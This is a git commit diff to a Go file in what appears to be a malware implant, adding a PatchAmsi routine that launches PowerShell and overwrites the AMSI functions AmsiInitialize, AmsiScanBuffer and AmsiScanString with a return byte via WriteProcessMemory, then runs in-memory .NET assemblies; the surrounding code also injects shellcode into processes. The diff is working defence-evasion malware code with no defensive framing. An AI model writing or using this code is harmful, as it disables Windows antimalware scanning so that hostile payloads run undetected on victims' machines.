597f3206bf51caa0de8b55153ce2fedf53debf73
gatari <zavierspamstuff@gmail.com>
2025-05-16 22:09:42 +0800

    amsi

--- implant/cmd/commands/problematic.go
+++ implant/cmd/commands/problematic.go
@@ -3,6 +3,7 @@ package commands
 import (
 	"fmt"
 	"runtime"
+	"syscall"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -50,6 +51,11 @@ func Inject(pid int, shellcode []byte) (string, error) {
 func Execute_Assembly(asm []byte, params []string) (string, error) {
 	runtime.KeepAlive(asm)
 	fmt.Println("[*] Executing assembly with params: ", params)
+	fmt.Println("[*] Assembly length:", len(asm))
+
+	fmt.Println("[*] Patching AMSI...")
+	PatchAmsi()
+	fmt.Println("[*] AMSI patched.")
 	runtime := ""
 	err := k32.ExecuteByteArray(runtime, asm, params)
 	if err != nil {
@@ -57,4 +63,69 @@ func Execute_Assembly(asm []byte, params []string) (string, error) {
 	}
 	fmt.Println("[*] Assembly executed successfully.")
 	return "executed, but no output", nil
+}
+
+// https://github.com/timwhitez/Doge-AMSI-patch/blob/main/amsi.go
+func PatchAmsi() {
+	var (
+		fntdll             = syscall.NewLazyDLL("amsi.dll")
+		AmsiScanBuffer     = fntdll.NewProc("AmsiScanBuffer")
+		AmsiScanString     = fntdll.NewProc("AmsiScanString")
+		AmsiInitialize     = fntdll.NewProc("AmsiInitialize")
+		k32                = syscall.NewLazyDLL("kernel32.dll")
+		WriteProcessMemory = k32.NewProc("WriteProcessMemory")
+	)
+	si := new(syscall.StartupInfo)
+	pi := new(syscall.ProcessInformation)
+	si.Cb = uint32(unsafe.Sizeof(si))
+	err2 := syscall.CreateProcess(nil, syscall.StringToUTF16Ptr("powershell -NoExit"), nil, nil, false, windows.CREATE_NEW_CONSOLE, nil, nil, si, pi)
+	if err2 != nil {
+		panic(err2)
+	}
+
+	hProcess := uintptr(pi.Process)
+	hThread := uintptr(pi.Thread)
+
+	var oldProtect uint32
+	var old uint32
+	patch := []byte{0xc3}
+
+	windows.SleepEx(500, false)
+
+	fmt.Println("patching amsi ......")
+
+	amsi := []uintptr{
+		AmsiInitialize.Addr(),
+		AmsiScanBuffer.Addr(),
+		AmsiScanString.Addr(),
+	}
+
+	var e error
+	var r1 uintptr
+
+	for _, baseAddr := range amsi {
+		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, syscall.PAGE_READWRITE, &oldProtect)
+		if e != nil {
+			fmt.Println("virtualprotect error")
+			fmt.Println(e)
+			return
+		}
+		r1, _, e = WriteProcessMemory.Call(hProcess, baseAddr, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
+		if r1 == 0 {
+			fmt.Println("WriteProcessMemory error")
+			fmt.Println(e)
+			return
+		}
+		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, oldProtect, &old)
+		if e != nil {
+			fmt.Println("virtualprotect error")
+			fmt.Println(e)
+			return
+		}
+	}
+
+	fmt.Println("amsi patched!!\n")
+
+	windows.CloseHandle(windows.Handle(hProcess))
+	windows.CloseHandle(windows.Handle(hThread))
 }
